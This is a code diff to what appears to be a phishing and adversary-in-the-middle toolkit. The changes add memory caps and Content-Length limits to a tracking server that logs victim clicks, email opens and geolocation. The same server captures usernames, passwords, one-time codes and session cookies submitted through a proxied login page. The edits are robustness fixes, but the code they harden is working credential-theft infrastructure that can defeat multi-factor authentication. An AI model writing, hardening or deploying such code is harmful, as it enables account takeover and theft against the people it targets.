@@ -449,7 +449,18 @@ class SessionCapture:
 
 
 class HitStore:
-    """Thread-safe in-memory ledger of clicks, opens and captured creds."""
+    """Thread-safe in-memory ledger of clicks, opens and captured creds.
+
+    A-6: the store is fed by a PUBLIC listener, so it must not be an
+    unbounded memory sink — image proxies, link previews and scanners hit
+    these endpoints without any operator involvement. Per-code event lists
+    are capped (oldest dropped) and the number of distinct codes is capped
+    too, so a flood of random codes cannot grow the process without limit.
+    """
+
+    MAX_EVENTS_PER_CODE = 2000     # hits / opens per code
+    MAX_CREDS_PER_CODE = 500       # auth captures are precious: keep more
+    MAX_CODES = 5000               # distinct tracking codes retained
 
     def __init__(self) -> None:
         self._hits: Dict[str, List[VictimHit]] = {}
@@ -461,13 +472,24 @@ class HitStore:
     def _now(self) -> str:
         return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
 
+    def _trim_codes(self, bucket: Dict[str, List]) -> None:
+        """Keep the newest MAX_CODES codes in `bucket` (caller holds lock)."""
+        if len(bucket) <= self.MAX_CODES:
+            return
+        for stale in list(bucket.keys())[:len(bucket) - self.MAX_CODES]:
+            bucket.pop(stale, None)
+
     def record(self, code: str, ip: str, user_agent: str,
                referrer: str = "") -> VictimHit:
         fp = fingerprint_ua(user_agent)
         hit = VictimHit(ip=ip, user_agent=user_agent, time=self._now(),
                         referrer=referrer, geo=geo_lookup(ip), **fp)
         with self._lock:
-            self._hits.setdefault(code, []).append(hit)
+            bucket = self._hits.setdefault(code, [])
+            bucket.append(hit)
+            if len(bucket) > self.MAX_EVENTS_PER_CODE:
+                del bucket[:-self.MAX_EVENTS_PER_CODE]
+            self._trim_codes(self._hits)
         return hit
 
     def record_open(self, code: str, ip: str, user_agent: str,
@@ -476,7 +498,11 @@ class HitStore:
         ev = OpenEvent(ip=ip, user_agent=user_agent, time=self._now(),
                        proxied=bool(proxied), scanner=bool(scanner))
         with self._lock:
-            self._opens.setdefault(code, []).append(ev)
+            bucket = self._opens.setdefault(code, [])
+            bucket.append(ev)
+            if len(bucket) > self.MAX_EVENTS_PER_CODE:
+                del bucket[:-self.MAX_EVENTS_PER_CODE]
+            self._trim_codes(self._opens)
         return ev
 
     def record_cred(self, code: str, ip: str, user_agent: str,
@@ -484,7 +510,11 @@ class HitStore:
         cap = CredCapture(ip=ip, username=username, password=password,
                           otp=otp, user_agent=user_agent, time=self._now())
         with self._lock:
-            self._creds.setdefault(code, []).append(cap)
+            bucket = self._creds.setdefault(code, [])
+            bucket.append(cap)
+            if len(bucket) > self.MAX_CREDS_PER_CODE:
+                del bucket[:-self.MAX_CREDS_PER_CODE]
+            self._trim_codes(self._creds)
         return cap
 
     def hits(self, code: str) -> List[VictimHit]:
@@ -504,7 +534,11 @@ class HitStore:
         cap = SessionCapture(ip=ip, cookies=cookies, username=username,
                              user_agent=user_agent, time=self._now())
         with self._lock:
-            self._sessions.setdefault(code, []).append(cap)
+            bucket = self._sessions.setdefault(code, [])
+            bucket.append(cap)
+            if len(bucket) > self.MAX_CREDS_PER_CODE:
+                del bucket[:-self.MAX_CREDS_PER_CODE]
+            self._trim_codes(self._sessions)
         return cap
 
     def sessions(self, code: str) -> List[SessionCapture]:
@@ -1028,7 +1062,12 @@ class TrackingServer:
             if not entry:
                 handler._send(404, b"not found", "text/plain")
                 return
-            length = int(handler.headers.get("Content-Length", "0") or 0)
+            # defensive: a public listener must not trust Content-Length
+            try:
+                length = min(int(handler.headers.get("Content-Length", "0") or 0),
+                             64 * 1024)
+            except (TypeError, ValueError):
+                length = 0
             raw = handler.rfile.read(length) if length else b""
             proxy = _aitm_proxy(handler, acode, entry)
             status, headers, body = proxy.submit(
@@ -1225,7 +1264,12 @@ class TrackingServer:
                 if not path.startswith("c/") or not code:
                     self._send(404, b"not found", "text/plain")
                     return
-                length = int(self.headers.get("Content-Length", "0") or 0)
+                # defensive: a public listener must not trust Content-Length
+                try:
+                    length = min(int(self.headers.get("Content-Length", "0") or 0),
+                                 64 * 1024)
+                except (TypeError, ValueError):
+                    length = 0
                 raw = self.rfile.read(length).decode("utf-8", "replace")
                 form = urllib.parse.parse_qs(raw)
                 store.record_cred(
